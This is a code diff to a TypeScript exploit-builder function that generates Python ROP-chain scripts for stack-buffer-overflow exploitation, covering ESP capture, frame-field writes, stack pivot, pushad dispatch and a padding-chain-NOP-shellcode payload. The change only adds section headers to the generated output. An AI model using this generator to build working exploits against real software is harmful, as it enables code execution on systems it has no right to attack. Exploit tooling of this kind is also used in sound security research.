@@ -214,6 +214,10 @@ export function buildExploit(input: BuildInput): Build {
     return [{ line: `# ${target}: ${how}` }, { line: `${target} = hole(${JSON.stringify(target)})` }];
   };
 
+  // Opens a group of chain lines. Every c.rop in the chain sits under one, so the lines that built a field
+  // are found by scrolling to its header instead of counting dwords.
+  const group = (title: string): Op => ({ line: `#-- ${title}` });
+
   const usable = (gadget: RopGadget, keep: string[], own: string[]): boolean =>
     !movesEsp(gadget)
     && memoryWrites(gadget, "").length === 0
@@ -400,6 +404,7 @@ export function buildExploit(input: BuildInput): Build {
       chain.push(...hole("c", "[4/7] has no exact pick for capture, add, copy, write or pivot: write this chain by hand"));
     } else {
       const fns = frame.map((slot) => literal(slot) ? undefined : defineLoader(slot, valueRegister, [field]));
+      chain.push(group("the captured ESP, and the address of field 1"));
       chain.push({ line: `# ${field} = field 1 - ${hex(writeOffset)}: the captured ESP is buffer offset OFFSET + 4, field 1 is FRAME_AT` });
       chain.push({ line: `# confirm: bp ${hex(gadgetAddress(capture.gadget))} ; g ; r esp ; s -d esp-400 L100 45454545` });
       chain.push({ call: entry(capture.gadget, "capture ESP"), values: [] });
@@ -412,6 +417,9 @@ export function buildExploit(input: BuildInput): Build {
       frame.forEach((slot, i) => {
         const fn = fns[i];
         if (!fn) return;
+        // The header opens the group, so every line that builds this field is under it: the advance that
+        // walks the pointer here, the load, and the write. A wrong field is one scroll, not a dword count.
+        chain.push(group(`field ${i + 1}: ${slot.name}`));
         if (i > at) {
           const there = advance ? moveOps(field, advance.at.dest ?? field, []) : undefined;
           const back = advance ? moveOps(advance.at.dest ?? field, field, []) : undefined;
@@ -420,7 +428,7 @@ export function buildExploit(input: BuildInput): Build {
           at = i;
         }
         const args = slot.source.kind === "shellcode" ? `c, ${i + 1}` : slot.source.kind === "size" ? "c, size" : "c";
-        chain.push({ line: `${fn}(${args})${" ".repeat(Math.max(1, 30 - fn.length - args.length))}# field ${i + 1}: ${slot.name}` });
+        chain.push({ line: `${fn}(${args})` });
         chain.push({ call: entry(write.gadget, "write the field"), values: [] });
       });
       const pops = popsAfterPivot(pivot.gadget);
@@ -428,6 +436,7 @@ export function buildExploit(input: BuildInput): Build {
       const toValue = moveOps(field, valueRegister, []);
       const math = arithmetic(valueRegister, []);
       const toPivot = moveOps(valueRegister, pivot.at.source ?? "", []);
+      chain.push(group("pivot: ESP onto field 1"));
       chain.push({ line: `# ${pivot.at.source} = field 1 - ${hex(4 * pops)}, so the ret after the pivot lands on field 1` });
       if (!toValue || !math || !toPivot) chain.push(...hole("pivot_value", `no way to move the field address into ${pivot.at.source}`));
       else {
@@ -439,6 +448,7 @@ export function buildExploit(input: BuildInput): Build {
       const sub = arithmetic(valueRegister, [field])?.sub !== false;
       chain.push(
         { line: "" },
+        group("the shellcode address, into the fields the loaders marked"),
         { line: "chain_end = OFFSET + 4 * len(c)" },
         { line: `def to_sled(field, gap):        # what the pop before the ${sub ? "sub" : "add"} needs, so the value lands on the NOPs` },
         { line: `    distance = chain_end + gap - (FRAME_AT + 4 * (field - 1)${writeOffset ? ` - ${hex(writeOffset)}` : ""})` },
@@ -461,7 +471,9 @@ export function buildExploit(input: BuildInput): Build {
     });
     frameBlock = [`PUSHAD_ORDER = [${order.join(", ")}]`, `# ${slots.map((slot) => `${slot.register} = ${slot.name}`).join(", ")}`];
     const dispatch = pick("pushad");
+    chain.push(group("the seven registers, in the order [6/7] fixes"));
     chain.push({ line: "for load in PUSHAD_ORDER: load(c)" });
+    chain.push(group("dispatch: pushad writes the whole frame at once"));
     if (dispatch && sequence(dispatch.gadget) !== "pushad ; ret") {
       chain.push({ line: `# ${input.module} has no clean pushad ; ret. This one is ${sequence(dispatch.gadget)}: everything after the pushad has to survive, or the chain dies before the ret.` });
     }
@@ -473,11 +485,15 @@ export function buildExploit(input: BuildInput): Build {
       if (slot.source.kind === "const") tail.push(hex(slot.source.value));
       else if (slot.source.kind === "named" && known) tail.push(slot.source.name);
       else {
+        chain.push(group(`${slot.name}: a dword after the pushad gadget, not a register`));
         chain.push(...load(slot, "eax", loaded));
         tail.push(`${ident(slot.name)}_value`);
       }
     }
-    if (tail.length > 0) chain.push({ line: `c.extend([${tail.join(", ")}])     # the dwords the call reads after the pushad gadget` });
+    if (tail.length > 0) {
+      chain.push(group("the dwords the call reads after the pushad gadget"));
+      chain.push({ line: `c.extend([${tail.join(", ")}])` });
+    }
     chain.push({ line: "" }, { line: "payload = b\"A\" * OFFSET + b\"\".join(p32(w) for w in c) + nops + shellcode" });
   }
 
